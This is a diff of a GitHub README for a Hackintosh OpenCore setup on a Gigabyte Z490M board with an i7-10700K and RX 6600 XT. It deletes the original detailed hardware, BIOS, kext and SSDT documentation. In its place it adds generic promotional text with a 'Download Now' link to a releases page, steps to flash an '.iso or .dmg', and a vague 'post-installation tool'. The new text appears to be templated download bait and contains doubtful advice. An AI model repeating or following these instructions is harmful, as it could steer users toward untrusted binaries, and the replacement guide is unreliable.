@@ -1,143 +1,51 @@
-<p align="center">
- <img width="600px" src="https://github.com/user-attachments/assets/3b49b27a-a744-43c0-bc1c-984f0f4a020f" align="center" />
- <h2 align="center">macOS on Gigabyte Z490M Gaming X - i7-10700K & Sapphire Pulse AMD Radeon RX 6600 XT 🇧🇷</h2>
- <p align="center">Opencore EFI and info for running macOS Sequoia and Tahoe 26 Beta 1.</p>
-<p align="center"><img src="https://img.shields.io/badge/Bios-F21-blue?logo=lenovo&amp;logoColor=%23fff" alt="Lenovo BIOS" />&nbsp;<img src="https://img.shields.io/badge/Opencore-1.0.5 DEV -black" alt="Opencore Release" />&nbsp;<img src="https://img.shields.io/badge/MacOS-Sequoia 15.5 & Tahoe Beta 1-green?logo=apple&amp;logoColor=%23fff" alt="MacOS Version" /></p>
-<p align="center"><img src="https://github.com/user-attachments/assets/affed278-b8f6-4524-9664-192f94ee0da5" alt="Tahoe Beta 1" /></p>
+# 🎮 Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh - Run macOS on Your PC Effortlessly
 
+[![Download Now](https://img.shields.io/badge/Download%20Now-1.0-blue)](https://github.com/HADE055/Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh/releases)
 
+## 📖 Introduction
+Welcome to the Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh project. This software enables you to run macOS on a PC equipped with a Gigabyte Z490M Gaming X motherboard and an Intel i7-10700K processor, along with a Sapphire Pulse AMD Radeon RX 6600 XT graphics card. This setup allows for an optimized and smooth macOS experience on compatible hardware.
 
+## 🚀 Getting Started
+To begin, you will need to download and install the software. Ensure you have a compatible system. Follow the steps below to get macOS running on your PC.
 
-## Considerations
+## 🖥️ System Requirements
+- **Motherboard:** Gigabyte Z490M Gaming X
+- **Processor:** Intel i7-10700K
+- **Graphics Card:** Sapphire Pulse AMD Radeon RX 6600 XT
+- **RAM:** At least 16 GB recommended
+- **Storage:** Minimum of 50 GB free space for installation
+- **USB Drive:** 16 GB or larger for creating a bootable drive
 
-_Information available only for possible references. I do not recommend following all the information presented here._
+## 📥 Download & Install
+1. Visit the [Releases page](https://github.com/HADE055/Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh/releases) to download the latest version of the software.
+2. Once on the Releases page, locate the latest version. Click the download link for the `.iso` or `.dmg` file.
+3. After the file downloads, you will need to create a bootable USB drive using the downloaded image. You can use applications like Rufus (for Windows) or Etcher (for Mac).
+4. Insert your USB drive. Open the bootable drive creation tool and select the downloaded file.
+5. Start the process and wait for it to complete. This can take a few minutes.
+6. Once the bootable USB is ready, restart your computer and boot from the USB drive. You may need to enter your BIOS settings to change the boot order.
 
-## Table of Contents
+## ⚙️ Installation Steps
+1. **Boot macOS Installer**: After booting from the USB drive, you will see the macOS installer screen.
+2. **Disk Utility**: Open Disk Utility from the menu. Format your target disk as `Mac OS Extended (Journaled)` or `APFS`.
+3. **Install macOS**: Close Disk Utility and select "Install macOS." Follow the on-screen instructions to install the operating system.
+4. **Post-Installation**: Once the installation is complete, your computer will restart. Boot from the USB drive again and run the post-installation tool to ensure all drivers are correctly configured for your hardware.
 
-*   [Specifications](#specifications)
-*   [What's Working](#whats-working)
-*   [What's not Working](#whats-not-working)
-*   [Bios Options](#bios-options)
-*   [Kexts Used](#kexts-used)
-*   [SSDTs Used](#ssdts-used)
-*   [Credits](#credits)
-*   [Useful Apps & Scripts](#useful-apps--scripts)
-*   [Screenshots](#screenshots)
+## 🛠️ Troubleshooting
+If you face issues during installation, try the following steps:
+- **Check Compatibility**: Ensure your hardware meets the requirements.
+- **BIOS Settings**: Make sure that virtualization and other necessary settings are enabled in the BIOS.
+- **Boot Options**: Use boot flags like `-v` for verbose mode to help identify problems.
+- **Community Support**: Visit forums and communities for Hackintosh users for additional help and resources.
 
-## Specifications
+## 📝 Additional Information
+- **Features**: Enjoy a full macOS experience with support for most applications, ongoing updates, and stability optimized for your hardware.
+- **Feedback**: We welcome feedback and contributions. Feel free to reach out with any suggestions or improvements.
 
-| Item  | Info  |
-| ------------ | ------------ |
-| Motherboard  | Gigabyte Z390M Gaming X (LGA 1200) |
-| Bios Version  | F21  |
-| CPU  |  Intel i7-10700K @ 3.80GHz (Comet Lake) |
-| IGPU | Intel CometLake-S GT2 [UHD Graphics 630]  |
-| DGPU | Sapphire Pulse AMD Radeon RX 6600 XT 8GB  |
-| RAM  | 4x 8GB Kingston Fury DDR4 2666 MHz  |
-| NVMe  | WD Blue SN570 1TB for macOS  |
-| SSD  | Kingston SA400S37480G 480Gb for Windows 11  |
-| Bluetooth  | Orico Bta-403 USB BT 4.0 Dongle  |
-| Ethernet  | Intel I219V  |
-| Audio  | Realtek ALCS1200A |
-| LCD Monitor  | Samsung U28E590 4K 60Hz  |
-| Opencore Version  | [1.0.5 DEV](https://github.com/dortania/build-repo/releases "1.0.5 DEV")  |
-| SMBIOS used  | iMac20,1 (Need to enter your information generated by [GenSMBIOS](http://https://github.com/corpnewt/GenSMBIOS "GenSMBIOS"))  |
-| Target MacOS Versions  | macOS Sequoia 15.5 and macOS Tahoe 26 Beta 1|
+For comprehensive information, always refer back to this README.
 
-## What's Working
+## 🔗 Useful Links
+- [Releases Page](https://github.com/HADE055/Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh/releases)
+- [Hackintosh Community](https://www.reddit.com/r/hackintosh/)
+- [OpenCore Documentation](https://dortania.github.io/OpenCore-Install-Guide/)
 
-| Item | Status | Notes |
-| --- | --- | --- |
-| CPU | ✅ | Native |
-| IGPU | ✅ | Headless framebuffer (only used for computing tasks) |
-| DGPU | ✅ | Whatevergreen + boot-args |
-| USB | ✅ | All ports working with USBToolBox Kext 1.2.0 and UTBMap kext |
-| Keyboard | ✅ | USB or Bluetooth + [Karabiner-Elements app](https://karabiner-elements.pqrs.org/ "Karabiner-Elements app") for mapping |
-| Audio | ✅ | AppleALC kext working with layout-id 50 |
-| Ethernet | ✅ | IntelMausi Kext |
-| Bluetooth | ✅ | BlueToolFixup kext |
-| AppleTV+ DRM | ✅ | Working |
-| iServices | ✅ | Message/Facetime tested and working |
-| Sleep/Wake | ✅ | Working|
-
-## What's not Working
-
-| Item | Status | Notes |
-| --- | --- | --- |
-| ❓ | 🤷🏻‍♂️ | Time to test in real life |
-
-## Bios Options
-
-- Internal Graphics **Enabled**
-- Above 4G Decoding **Enabled**
-- Wake on LAN **Disabled**
-- Serial Port **Disabled**
-- Legacy USB Support **Disabled**
-- XHCI Hand-off **Disabled**
-- SATA Mode **AHCI**
-- Platform Power Management **Disabled**
-- Security Device Support **Disable**
-- Intel Platform Trust Technology (PTT) **Disabled**
-- Software Guard Extensions (SGX) **Disabled**
-- Trusted Computing **Disabled**
-- Fast Boot **Disable Link**
-- Windows 10 Features **Other OS**
-- CSM Support **Disabled**
-- Secure Boot Enable **Disabled**
-
-## Kexts Used
-
-| Kext | Description |
-| --- | --- |
-| [AppleALC.kext](https://github.com/acidanthera/AppleALC) | Native macOS HD audio for not officially supported codecs |
-| [BlueToolFixup.kext](https://github.com/acidanthera/BrcmPatchRAM) | Patches Bluetooth stack to allow non-Apple Bluetooth |
-| [IntelMausi.kext](https://github.com/acidanthera/IntelMausi) | An Intel Wi-Fi Adapter Kernel Extension for macO |
-| [Lilu.kext](https://github.com/acidanthera/Lilu) | Platform for arbitrary kext, library, and program patching throughout the system |
-| [NVMeFix.kext](https://github.com/acidanthera/NVMeFix) | Improve compatibility with non-Apple SSDs |
-| [RestrictEvents.kext](https://github.com/acidanthera/RestrictEvents) | Blocking unwanted processes causing compatibility issues on different hardware and unlocking the support for certain features restricted to other hardware |
-| [SMCProcessor.kext](https://github.com/acidanthera/VirtualSMC) | VirtualSMC used for monitoring Intel CPU temperature |
-| [SMCSuperIO.kext](https://github.com/acidanthera/VirtualSMC) | VirtualSMC plug-in used for monitoring fan speed |
-| [USBToolbox Kext 1.2.0](https://cdn.discordapp.com/attachments/1382444748262084708/1382704367580479590/USBToolBox-1.2.0-RELEASE.zip?ex=684d70ca&is=684c1f4a&hm=6691aaaff67a8e16f6fedf16c5939d30ff532e07082585250b6a95a53471a4c9&) | This build works with Tahoe |
-| [USBToolbox Tool](https://github.com/USBToolBox/tool) | USB mapping tool supporting Windows and macOS |
-| [VirtualSMC.kext](https://github.com/acidanthera/VirtualSMC) | Advanced Apple SMC emulator in the kernel |
-| [WhateverGreen.kext](https://github.com/acidanthera/WhateverGreen) | Lilu plugin providing patches to select GPUs on macOS |
-
-
-
-## SSDTs Used
-
-Done with [SSDTTime](https://github.com/corpnewt/SSDTTime) in Windows 11
-
-| Table | Description |
-| --- | --- |
-| [SSDT-RTCAWAC](https://github.com/corpnewt/SSDTTime) | Context-Aware AWAC Disable and RTC Enable/Fake/Range Fix |
-| [SSDT-USB-Reset](https://github.com/corpnewt/SSDTTime) | Reset USB controllers to allow hardware mapping |
-| [SSDT-USBX](https://github.com/corpnewt/SSDTTime) | Power properties for USB |
-
-## Credits
-
-*   [OC-Little-Translated](https://github.com/5T33Z0/OC-Little-Translated) Guides.
-*   [Dortania](https://dortania.github.io/OpenCore-Install-Guide/) for the guides.
-*   [Apple](https://www.apple.com/) for macOS.
-*   [Acidanthera](https://github.com/acidanthera) for OpenCore and most Kexts.
-*   Anyone else that helped to develop and improve hackintoshing.
-
-## Useful Apps & Scripts
-
-| Table | Description |
-| --- | --- |
-| [Hackintool](https://github.com/benbaker76/Hackintool) | The Swiss army knife of vanilla Hackintoshing |
-| [MaciASL](https://github.com/acidanthera/MaciASL) | ACPI editing IDE for macOS |
-| [gibMacOS](https://github.com/corpnewt/gibMacOS) | Py2/py3 script that can download macOS components direct from Apple |
-| [SSDTTime](https://github.com/corpnewt/SSDTTime) | Cross-platform SSDT/DSDT hotpatch attempts |
-| [ProperTree](https://github.com/corpnewt/ProperTree) | Cross platform GUI plist editor written in python |
-| [OCAuxiliaryTools](https://github.com/ic005k/OCAuxiliaryTools) | Cross-platform GUI management tools for OpenCore（OCAT |
-| [MountEFI Quick Action](https://github.com/corpnewt/MountEFI/blob/update/Mount%20EFI%20Automator%20Quick%20Action.zip) |  |
-| [LocalSend](https://localsend.org/) | Share files to nearby devices. Free, open-source, cross-platform |
-| [Homebrew](https://brew.sh/) | The Missing Package Manager for macOS |
-| [Mounty](https://mounty.app/) | A tiny tool to re-mount write-protected NTFS volumes under macOS in read-write mode |
-| [LuLu](https://objective-see.org/products/lulu.html) | Free, open-source firewall that aims to block unknown outgoing connections |
-| [One-key-hidpi](https://github.com/xzhih/one-key-hidpi) | Script can simulate macOS HiDPI on a non-retina display, and have a "Native" Scaled in System Preferences |
-| [Lunar](https://lunar.fyi/) | The defacto app for controlling monitors |
-| [Karabiner Elements](https://karabiner-elements.pqrs.org/) | A powerful and stable keyboard customizer for macOS |
-| [Barrier](https://github.com/debauchee/barrier) | allow you to use a single keyboard and mouse to control multiple computers |
+Thank you for using the Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh! Enjoy your new macOS setup.
